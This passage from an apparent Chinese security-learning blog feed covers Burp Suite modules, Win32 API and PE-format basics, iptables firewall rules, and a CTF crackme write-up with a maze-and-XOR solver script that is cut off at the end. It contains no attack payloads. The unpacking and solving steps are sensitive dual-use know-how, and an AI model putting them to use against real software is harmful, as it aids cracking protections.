src="https://i.imgur.com/1flpjdv.png" alt=""><br><img src="https://i.imgur.com/kdyDg9s.png" alt=""><br><img src="https://i.imgur.com/yicYuFW.png" alt=""><br><img src="https://i.imgur.com/Uhu3Mx3.png" alt=""><br><img src="https://i.imgur.com/pgZUCbH.png" alt=""><br><img src="https://i.imgur.com/ln6ud1a.png" alt=""><br><img src="https://i.imgur.com/3t14eDJ.png" alt=""><br><img src="https://i.imgur.com/4kMNdpE.png" alt=""></p><h2 id="3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。"><a href="#3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。" class="headerlink" title="3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。"></a>3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。</h2><p>参考这个链接:<a href="https://bbs.ichunqiu.com/thread-16260-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-16260-1-1.html</a></p><h2 id="4、Repeater-重放"><a href="#4、Repeater-重放" class="headerlink" title="4、Repeater(重放)"></a>4、Repeater(重放)</h2><p>手工修改，可以不断重放，如下:<br><img src="https://i.imgur.com/4cgA3Z4.png" alt=""></p><h2 id="5、Decoder-解密"><a href="#5、Decoder-解密" class="headerlink" title="5、Decoder(解密)"></a>5、Decoder(解密)</h2><p>用于普通解密，hash<br><img src="https://i.imgur.com/31NPqMZ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>加密与解密</title>
    <link href="http://yoursite.com/2017/12/30/encode_and_decode_base/"/>
    <id>http://yoursite.com/2017/12/30/encode_and_decode_base/</id>
    <published>2017-12-30T02:02:57.605Z</published>
    <updated>2018-03-26T13:11:24.209Z</updated>
    
    <content type="html"><![CDATA[<p>迟迟没有学习的加密与解密，现在开始吧<br><a id="more"></a></p><h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="一、Win-API简介"><a href="#一、Win-API简介" class="headerlink" title="一、Win API简介"></a>一、Win API简介</h2><p>API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.<br>Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。<br>User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。<br>GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。</p><h2 id="二、常用的Win32-API函数"><a href="#二、常用的Win32-API函数" class="headerlink" title="二、常用的Win32 API函数"></a>二、常用的Win32 API函数</h2><h3 id="1、GetWindowText函数"><a href="#1、GetWindowText函数" class="headerlink" title="1、GetWindowText函数"></a>1、GetWindowText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetWindowText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hwnd,  <span class="comment">//窗口或文本控件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetWindowTextA,Unicode版是GetWindowTextW.</p><h3 id="2、GetDlgItem函数"><a href="#2、GetDlgItem函数" class="headerlink" title="2、GetDlgItem函数"></a>2、GetDlgItem函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">HWND <span class="title">GetDlgItem</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,<span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem<span class="comment">//控件标识</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回对话框句柄，失败就返回零。</p><h3 id="3、GetDlgItemText函数"><a href="#3、GetDlgItemText函数" class="headerlink" title="3、GetDlgItemText函数"></a>3、GetDlgItemText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW.</p><h3 id="4、GetDlgItemInt函数"><a href="#4、GetDlgItemInt函数" class="headerlink" title="4、GetDlgItemInt函数"></a>4、GetDlgItemInt函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemInt</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL *lpTranslated,<span class="comment">//接收成功/失败指示的指针</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL bSigned<span class="comment">//指定为有符号还是无符号</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW.</p><h2 id="5、MessageBox函数"><a href="#5、MessageBox函数" class="headerlink" title="5、MessageBox函数"></a>5、MessageBox函数</h2><p>此函数在USER32.DLL用户模块中，创建和显示信息框<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">MessageBox</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,  <span class="comment">//父窗口句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpText,<span class="comment">//消息框文本地址</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpCaption,<span class="comment">//消息框标题地址</span></span></span></div><div class="line"><span class="function"><span class="params">UINT uType<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是MessageBoxA,Unicode版是MessageBoxW.</p><h2 id="三、什么是句柄"><a href="#三、什么是句柄" class="headerlink" title="三、什么是句柄"></a>三、什么是句柄</h2><p>句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。</p><h2 id="四、Windows消息机制"><a href="#四、Windows消息机制" class="headerlink" title="四、Windows消息机制"></a>四、Windows消息机制</h2><p>Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。<br>Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。</p><h3 id="1、SendMessage函数"><a href="#1、SendMessage函数" class="headerlink" title="1、SendMessage函数"></a>1、SendMessage函数</h3><p>调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//目的窗口的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">//消息标识符</span></span></span></div><div class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//消息的WPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的LPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：由具体的消息决定，如消息投递成功，返回TURE(非零)</p><h3 id="2、WM-COMMAND消息"><a href="#2、WM-COMMAND消息" class="headerlink" title="2、WM_COMMAND消息"></a>2、WM_COMMAND消息</h3><p>当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WM_COMMAND</div><div class="line">wNotifyCode = HIWORD(wParam);<span class="comment">//通告代码</span></div><div class="line">wID = LOWORD(wParam)   <span class="comment">//菜单条目，控件标识符</span></div><div class="line">hwndCtl = (HWND) lParam, <span class="comment">//控件句柄</span></div><div class="line">)</div></pre></td></tr></table></figure></p><p>返回值：系统处理这条消息，返回零</p><h2 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h2><p>虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。<br>简单地说，虚拟内存的实现方法和过程如下:</p><p>(1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)<br>(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)<br>(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存<br>(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中<br>(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置<br>如果上面步骤不能理解，那明白以下几点就可以了：<br>1、应用程序不会直接访问物理地址<br>2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问<br>3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的<br>4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。</p><h3 id="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"><a href="#使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。" class="headerlink" title="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"></a>使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。</h3><h2 id="六、简单介绍PE"><a href="#六、简单介绍PE" class="headerlink" title="六、简单介绍PE"></a>六、简单介绍PE</h2><p>Windows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。<br>每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等<br>.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码<br>.rdata:是运行期只读数据<br>.data:是初始化的数据块<br>.idata:包含其它外来DLL的函数技巧数据，即输入表。<br>.rsrc:包含模块的全部资源，如图标，菜单，位图等。<br>PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。<br><img src="http://chuantu.biz/t6/190/1514609990x-1566657870.png" alt=""><br>PE相关的名词解释如下:<br>(1)入口点(Entry Point)<br>PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。<br>(2)文件偏移地址(File Offset)<br>当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0<br>(3)虚拟地址(Virtual Address,VA)<br>由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。<br>(4)基地址(ImageBase)<br>文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。<br>(5)相对虚拟地址(Relative Virual Address,RVA)<br>表示此段代码在内存中相对于基地址的偏移,即：<br>相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迟迟没有学习的加密与解密，现在开始吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Liunx下的iptables</title>
    <link href="http://yoursite.com/2017/12/19/iptables/"/>
    <id>http://yoursite.com/2017/12/19/iptables/</id>
    <published>2017-12-19T12:20:31.231Z</published>
    <updated>2017-12-19T14:14:33.509Z</updated>
    
    <content type="html"><![CDATA[<p>iptables是linux下的防火墙，得好好学习。<br><a id="more"></a></p><h2 id="1、iptables是什么"><a href="#1、iptables是什么" class="headerlink" title="1、iptables是什么"></a>1、iptables是什么</h2><p>iptables是netfilter的基本框架，即liunx发行版下的防火墙，其实就是过滤数据包。<br>举个栗子: 当Internet来了一个主机，想要进入主机。这时，会先经过iptables的规则，检查通过则接受(accept),否则，就会丢弃(drop)。iptables的规则是有顺序的，从开始配置，若是某一条匹配成功，则执行这条规则，后面的规则都不会执行。当所有的规则都不匹配，则丢弃(drop).</p><h2 id="1、iptables的策略"><a href="#1、iptables的策略" class="headerlink" title="1、iptables的策略"></a>1、iptables的策略</h2><p>一般分为两种策略: “通”策略(定义只有指定ip能访问)和”堵”策略(所有的都能访问，但是有身份认证)</p><p>因为iptable有许多的规则，所有我们定义了许多的表(table),每个表的规则都不一样。比如filter,nat，mangle</p><p>数据包中允许或者不允许进入本机——filter(过滤器)<br>地址转换的功能的则是——nat(地址转换)<br>修改报文原数据的标志位——mangle(数据包修改QOS)</p><h2 id="2、iptables常见的表"><a href="#2、iptables常见的表" class="headerlink" title="2、iptables常见的表"></a>2、iptables常见的表</h2><p>每个表中有许多的规则链</p><p>filter(过滤器)——主要用于防火墙<br><code>INPUT</code>:处理输入数据包规则链<br><code>OUTPUT</code>:处理输出数据包规则链<br><code>FORWARD</code>:将来到本机的数据包转发到其它主机(这里与nat有关)的规则链</p><p>nat(地址转换)<br><code>PREROUTING</code> :地址转换前的规则<br><code>POSTROUTING</code>:地址转换后的规则<br><code>OUTPUT</code>: 与发送出去的数据包有关</p><p>mangle(修改数据包）<br>mangle表的主要功能是根据规则修改数据包的一些标志位，以便其他规则或程序可以利用这种标志对数据包进行过滤或策略路由。</p><p>最常用的是filter表，我们的主要学习对象</p><h2 id="3、iptables命令"><a href="#3、iptables命令" class="headerlink" title="3、iptables命令"></a>3、iptables命令</h2><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>iptables (选项) (参数)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-t&lt;表&gt;：指定要操纵的表； </div><div class="line">-A：向规则链中添加条目,添加到尾部； </div><div class="line">-D：从规则链中删除条目； </div><div class="line">-I：向规则链中插入条目,默认添加到首部； </div><div class="line">-R：替换规则链中的条目； </div><div class="line">-L：显示规则链中已有的条目； </div><div class="line">-F：清楚规则链中已有的条目； </div><div class="line">-Z：清空规则链中的数据包计算器和字节计数器； </div><div class="line">-N：创建新的用户自定义规则链； </div><div class="line">-P：定义规则链中的默认目标； </div><div class="line">-h：显示帮助信息； </div><div class="line">-p：指定要匹配的数据包协议类型； </div><div class="line">-s：指定要匹配的数据包源ip地址； </div><div class="line">-j&lt;目标&gt;：指定要跳转的目标； </div><div class="line">-i&lt;网络接口&gt;：指定数据包进入本机的网络接口； </div><div class="line">-o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。</div></pre></td></tr></table></figure></p><h4 id="iptables命令选项输入顺序："><a href="#iptables命令选项输入顺序：" class="headerlink" title="iptables命令选项输入顺序："></a>iptables命令选项输入顺序：</h4><p><code>iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作</code></p><h4 id="一些动作"><a href="#一些动作" class="headerlink" title="一些动作"></a>一些动作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">accept：接收数据包。 </div><div class="line">DROP：丢弃数据包。 </div><div class="line">REDIRECT：重定向、映射、透明代理。 </div><div class="line">SNAT：源地址转换。 </div><div class="line">DNAT：目标地址转换。 </div><div class="line">MASQUERADE：IP伪装（NAT），用于ADSL。 </div><div class="line">LOG：日志记录。</div></pre></td></tr></table></figure><h4 id="添加规则-如-屏蔽ip"><a href="#添加规则-如-屏蔽ip" class="headerlink" title="添加规则(如:屏蔽ip)"></a>添加规则(如:屏蔽ip)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -j DROP #屏蔽所有IP的命令 </div><div class="line">iptables -A INPUT -s 192.168.1.25 -j DROP #将这条命令添加到规则的尾部，屏蔽单个IP的命令 </div><div class="line">iptables -I INPUT -s 192.168.1.1/24 -j DROP #封整个段即从192.168.1.0到192.168.1.255的命令</div></pre></td></tr></table></figure><h4 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -D INPUT -s 192.168.1.25 -j DROP #将这条命令从规则中删除</div><div class="line">iptables -D INPUT 2 #删除INPUT里面的第2条规则(从最上面开始)</div></pre></td></tr></table></figure><h4 id="限定某个ip登录ssh"><a href="#限定某个ip登录ssh" class="headerlink" title="限定某个ip登录ssh"></a>限定某个ip登录ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.35 -j ACCEPT </div><div class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</div></pre></td></tr></table></figure><h4 id="更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化"><a href="#更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化" class="headerlink" title="更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)"></a>更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)</h4><p><code>iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to 1.2.3.4</code></p><h4 id="查看的iptables规则"><a href="#查看的iptables规则" class="headerlink" title="查看的iptables规则"></a>查看的iptables规则</h4><p><code>iptables -nL --line-number</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;iptables是linux下的防火墙，得好好学习。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>悄悄的wp</title>
    <link href="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/"/>
    <id>http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/</id>
    <published>2017-12-11T08:10:07.106Z</published>
    <updated>2018-03-26T12:38:29.333Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。<br><a id="more"></a></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><p>用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开<br>发现关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></div><div class="line">  __int64 v1; <span class="comment">// ST00_8</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+D0h] [ebp-3Ch]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your Secret:"</span>);</div><div class="line">  gets(&amp;Buffer);</div><div class="line">  <span class="keyword">if</span> ( sub_4110E6((<span class="keyword">int</span>)&amp;unk_417680, &amp;Buffer) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_41102D(&amp;unk_417680) )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"flag is flag&#123;%s&#125;\n"</span>, &amp;Buffer);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you can do it,again\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sorry\n"</span>);</div><div class="line">  &#125;</div><div class="line">  HIDWORD(v1) = v0;</div><div class="line">  LODWORD(v1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_4110E6功能如下（简单xor），发现key<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411520</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *Str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">28</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">    *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i];</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4115D0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  v2 = <span class="string">'&#125;'</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</div><div class="line">        --v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'r'</span>:</div><div class="line">        ++v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">        v2 += <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">        v2 -= <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] == <span class="string">'d'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] != <span class="string">'1'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0000000000000000</div><div class="line">0   1111111111 0</div><div class="line">0   1        1 0</div><div class="line">0   1        11d</div><div class="line">0   1          0</div><div class="line">0   1111111111 0</div><div class="line">0            1 0</div><div class="line">0000000000000s00</div><div class="line">``</div><div class="line">得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得</div><div class="line">``` C</div><div class="line">def Re1_qimo():</div><div class="line">    c = []</div><div class="line">    str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos;</div><div class="line">    key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53]</div><div class="line">    for i in range(28):</div><div class="line">        c.append(chr(ord(str[i])^key[i]))</div><div class="line">    print 